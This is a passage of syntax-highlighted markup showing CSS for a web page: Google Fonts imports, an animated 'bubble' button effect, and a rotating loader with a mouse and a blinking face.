class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Cabin+Sketch:400,700&quot;</span>);</span><span class="language-css"><span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;https://fonts.googleapis.com/css?family=Cabin+Sketch:400,700|Open+Sans|Oswald&quot;</span>);</span><span class="language-css"><span class="hljs-selector-class">.title-box</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: relative;</span><span class="language-css"><span class="hljs-attribute">margin</span>: auto;</span><span class="language-css"><span class="hljs-attribute">display</span>: block;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: none;</span><span class="language-css"><span class="hljs-attribute">z-index</span>:<span class="hljs-number">999</span>;</span><span class="language-css"><span class="hljs-attribute">border-bottom-color</span>: transparent;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span> &#123;</span><span class="language-css"><span class="hljs-attribute">color</span>: white;</span><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#6da0e0</span>;</span><span class="language-css"><span class="hljs-attribute">background-repeat</span>: no-repeat;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span><span class="hljs-selector-pseudo">:hover</span>,</span><span class="language-css"><span class="hljs-selector-class">.btn-bubble</span><span class="hljs-selector-pseudo">:focus</span> &#123;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: bubbles <span class="hljs-number">1s</span> forwards ease-out;</span><span class="language-css"><span class="hljs-attribute">animation</span>: bubbles <span class="hljs-number">1s</span> forwards ease-out;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">52%</span> <span class="hljs-number">125%</span> / <span class="hljs-number">1.2em</span> <span class="hljs-number">1.2em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">67%</span> <span class="hljs-number">133%</span> / <span class="hljs-number">0.66em</span> <span class="hljs-number">0.66em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">64%</span> <span class="hljs-number">93%</span> / <span class="hljs-number">1.17em</span> <span class="hljs-number">1.17em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">22%</span> <span class="hljs-number">88%</span> / <span class="hljs-number">1.04em</span> <span class="hljs-number">1.04em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">43%</span> <span class="hljs-number">95%</span> / <span class="hljs-number">0.87em</span> <span class="hljs-number">0.87em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">97%</span> <span class="hljs-number">116%</span> / <span class="hljs-number">0.62em</span> <span class="hljs-number">0.62em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">62%</span> <span class="hljs-number">97%</span> / <span class="hljs-number">0.64em</span> <span class="hljs-number">0.64em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">87%</span> <span class="hljs-number">135%</span> / <span class="hljs-number">0.68em</span> <span class="hljs-number">0.68em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) -<span class="hljs-number">4%</span> <span class="hljs-number">89%</span> / <span class="hljs-number">0.57em</span> <span class="hljs-number">0.57em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">89%</span> <span class="hljs-number">88%</span> / <span class="hljs-number">0.65em</span> <span class="hljs-number">0.65em</span>, <span class="hljs-built_in">radial-gradient</span>(circle at center, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">30%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">60%</span>, <span class="hljs-number">#eeeeff</span> <span class="hljs-number">65%</span>, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-number">70%</span>) <span class="hljs-number">6%</span> <span class="hljs-number">144%</span> / <span class="hljs-number">0.77em</span> <span class="hljs-number">0.77em</span>;</span><span class="language-css"><span class="hljs-attribute">background-color</span>: <span class="hljs-number">#6da0e0</span>;</span><span class="language-css"><span class="hljs-attribute">background-repeat</span>: no-repeat;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> bubbles &#123;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background-position</span>: <span class="hljs-number">45%</span> -<span class="hljs-number">182%</span>, <span class="hljs-number">61%</span> -<span class="hljs-number">215%</span>, <span class="hljs-number">62%</span> -<span class="hljs-number">196%</span>, <span class="hljs-number">18%</span> -<span class="hljs-number">318%</span>, <span class="hljs-number">51%</span> -<span class="hljs-number">86%</span>, <span class="hljs-number">88%</span> -<span class="hljs-number">292%</span>, <span class="hljs-number">66%</span> -<span class="hljs-number">244%</span>, <span class="hljs-number">89%</span> -<span class="hljs-number">313%</span>, -<span class="hljs-number">9%</span> <span class="hljs-number">9%</span>, <span class="hljs-number">99%</span> -<span class="hljs-number">107%</span>, <span class="hljs-number">16%</span> -<span class="hljs-number">282%</span>;</span><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> -<span class="hljs-number">6.5em</span> <span class="hljs-number">0</span> <span class="hljs-number">#0072c4</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> bubbles &#123;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background-position</span>: <span class="hljs-number">45%</span> -<span class="hljs-number">182%</span>, <span class="hljs-number">61%</span> -<span class="hljs-number">215%</span>, <span class="hljs-number">62%</span> -<span class="hljs-number">196%</span>, <span class="hljs-number">18%</span> -<span class="hljs-number">318%</span>, <span class="hljs-number">51%</span> -<span class="hljs-number">86%</span>, <span class="hljs-number">88%</span> -<span class="hljs-number">292%</span>, <span class="hljs-number">66%</span> -<span class="hljs-number">244%</span>, <span class="hljs-number">89%</span> -<span class="hljs-number">313%</span>, -<span class="hljs-number">9%</span> <span class="hljs-number">9%</span>, <span class="hljs-number">99%</span> -<span class="hljs-number">107%</span>, <span class="hljs-number">16%</span> -<span class="hljs-number">282%</span>;</span><span class="language-css"><span class="hljs-attribute">box-shadow</span>: inset <span class="hljs-number">0</span> -<span class="hljs-number">6.5em</span> <span class="hljs-number">0</span> <span class="hljs-number">#0072c4</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#10192d</span>;</span><span class="language-css"><span class="hljs-attribute">display</span>: flex;</span><span class="language-css"><span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;</span><span class="language-css"><span class="hljs-attribute">justify-content</span>: center;</span><span class="language-css"><span class="hljs-attribute">align-content</span>: center;</span><span class="language-css"><span class="hljs-attribute">align-items</span>: center;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-class">.btn</span> &#123;</span><span class="language-css"><span class="hljs-attribute">text-decoration</span>: none;</span><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">2em</span>;</span><span class="language-css"><span class="hljs-attribute">display</span>: block;</span><span class="language-css"><span class="hljs-attribute">text-decoration</span>: none;</span><span class="language-css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">2em</span>;</span><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><span class="language-css"><span class="hljs-attribute">text-align</span>: center;</span><span class="language-css">&#125;</span><span class="language-css"></span><span class="language-css"><span class="hljs-selector-tag">h1</span> &#123;</span><span class="language-css"><span class="hljs-attribute">text-align</span>: center;</span><span class="language-css"><span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Cabin Sketch&#x27;</span>, cursive;</span><span class="language-css"><span class="hljs-attribute">font-size</span>: <span class="hljs-number">90px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0px</span>;</span><span class="language-css"><span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;</span><span class="language-css"><span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-o-keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> rotate &#123;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-o-keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> hideEye &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">50px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">30px</span>;</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-webkit-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-moz-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@-o-keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-keyword">@keyframes</span> blink &#123;</span><span class="language-css"><span class="hljs-number">0%</span>, <span class="hljs-number">10%</span>, <span class="hljs-number">85%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">30%</span>,</span><span class="language-css"><span class="hljs-number">65%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">20px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">0%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">0.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-number">100%</span> &#123;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">1.08turn</span>);</span><span class="language-css">&#125;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> &#123;</span><span class="language-css"><span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#5e4674</span>;</span><span class="language-css"><span class="hljs-attribute">overflow</span>: hidden;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">bottom</span>: <span class="hljs-number">8%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">260px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">260px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">130px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> &#123;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;</span><span class="language-css"><span class="hljs-attribute">border</span>: solid <span class="hljs-number">#251c1c</span>;</span><span class="language-css"><span class="hljs-attribute">border-width</span>: <span class="hljs-number">5px</span> <span class="hljs-number">5px</span> <span class="hljs-number">3px</span> <span class="hljs-number">0</span>;</span><span class="language-css"><span class="hljs-attribute">border-top-color</span>: transparent;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">3px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">3px</span>;</span><span class="language-css">-webkit-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-moz-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">-o-<span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css"><span class="hljs-attribute">animation</span>: rotate <span class="hljs-number">3s</span> infinite linear;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">right</span>: <span class="hljs-number">31px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">18px</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">25px</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: <span class="hljs-number">#251c1c</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">80%</span> <span class="hljs-number">0</span> <span class="hljs-number">55%</span> <span class="hljs-number">50%</span> / <span class="hljs-number">55%</span> <span class="hljs-number">0</span> <span class="hljs-number">80%</span> <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(-<span class="hljs-number">95deg</span>);</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">9px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">9px</span>;</span><span class="language-css"><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">background</span>: inherit;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:before</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">5px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: -<span class="hljs-number">4px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.track</span> <span class="hljs-selector-class">.mouse</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">20px</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">11px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span class="hljs-number">130px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-left</span>: -<span class="hljs-number">65px</span>;</span><span class="language-css"><span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">65px</span>;</span><span class="language-css">&#125;</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:before</span>,</span><span class="language-css"><span class="hljs-selector-tag">body</span> <span class="hljs-selector-class">.loader</span> <span class="hljs-selector-class">.face</span><span class="hljs-selector-pseudo">:after</span> &#123;</span><span class="language-css"><span class="hljs-attribute">position</span>: absolute;</span><span class="language-css"><span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;</span><span class="language-css"><span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;</span><span class="language-css"><span class="hljs-attribute">height</span>: <span 